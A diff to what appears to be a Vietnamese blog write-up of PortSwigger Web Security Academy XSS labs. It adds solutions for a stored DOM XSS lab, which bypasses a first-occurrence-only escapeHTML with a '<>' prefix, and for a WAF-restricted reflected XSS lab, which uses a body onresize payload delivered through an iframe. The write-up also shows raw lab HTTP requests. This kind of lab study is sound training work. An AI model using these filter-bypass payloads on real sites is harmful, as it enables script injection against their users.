@@ -392,8 +392,7 @@ Host: 0a8e00370342ad4c80f112380058001f.web-security-academy.net
 ### Lab: Reflected DOM XSS
 - Mục tiêu: Tạo một `inject` gọi hàm `alert()`
 
-### Response from server
-
+**Response from server**
 #### /resources/js/searchResults.js
 ```http
 HTTP/2 200 OK
@@ -440,6 +439,81 @@ var searchResultsObj = {
   searchTerm: ""-alert(1)}//"
 };
 ```
+
+### Lab: Stored DOM XSS
+- Mục tiêu: Tấn công XSS gọi hàm `alert()`
+- Loại: Stored DOM XSS
+- Vị trí: Chức năng `comment`
+
+#### Check page source
+Request
+```http
+GET /resources/js/loadCommentsWithVulnerableEscapeHtml.js HTTP/2
+Host: 0a00002e0440efff8030f885004400e6.web-security-academy.net
+Cookie: session=dRrYTwa5lH6UkqG4udIYmGBoabCTSuJK
+```
+
+Response:
+```
+function loadComments(postCommentPath) {
+    let xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            let comments = JSON.parse(this.responseText);
+            displayComments(comments);
+        }
+    };
+    xhr.open("GET", postCommentPath + window.location.search);
+    xhr.send();
+
+    function escapeHTML(html) {
+        return html.replace('<', '&lt;').replace('>', '&gt;');
+    }
+    ...
+}
+```
+
+- Hàm `escapeHTML` chỉ `escape` kí tự đầu tiên của mỗi loại
+- Nó được sử dụng để  `escape` cho toàn bộ dự liệu
+- Chỉ cần thêm `<>` vào đầu payload để nó chỉ escape `<>` và payload
+
+Payload: `comment=<><img src=1 onerror=alert(1)>`
+
+Request:
+```http
+POST /post/comment HTTP/2
+Host: 0a3100e404e5fb188128346700980096.web-security-academy.net
+Cookie: session=eZnnJtH53BgIE75YVPjCrAqgQblzFcZR
+
+...
+
+csrf=sBvtxMG9FUqGYVWo63C2JSOOSDV9b5qx&postId=9&comment=%3C%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&name=a&email=a%40gmail.com&website=http%3A%2F%2Fa.com
+```
+
+### Lab: Reflected XSS into HTML context with most tags and attributes blocked
+- Mục tiêu: Thực hiện một cuộc tấn công `XSS` bỏ qua `WAF` và gọi hàm `print()`.
+- Loại `Reflect XSS`
+- Vị trí: Chức năng tìm kiếm
+
+#### Analyst
+Một số tag và atribute đã bị `WAF`, xảy ra 2 trường hợp:
+- "Tag is not allowed"
+- "Tag is not allowed"
+
+#### Exploit
+- Sử dụng **Burp Intruder** dể tự động hóa, kiểm tra các `tag, attribute` nào được phép sử dụng.
+- [Tag list](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/files/posts/2025-05-25-portswigger-cross-site-script/tag_líst.txt) - [Attribute list](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/files/posts/2025-05-25-portswigger-cross-site-script/attribute_list.txt)
+- Sử dụng payload sau khi tìm được: `<body onresize=print()>`
+- Trong 1 page chỉ có được 1 thẻ body, khi ta thêm 1 thẻ nữa, nó sẽ chỉ thêm `attribute` vào body hiện có
+- Đến `Exploit Server` 
+- Thêm payload vào phần body
+
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body+onresize%3dprint()>" onload=this.style.width='100px'>
+```
+
+- Deliver to victim
+- Kích hoạt sự kiện resize sau khi load `iframe` kéo theo sự kiện `onresize` làm cho `print()` được gọi
 
 ---
 Goodluck! 🍀🍀🍀
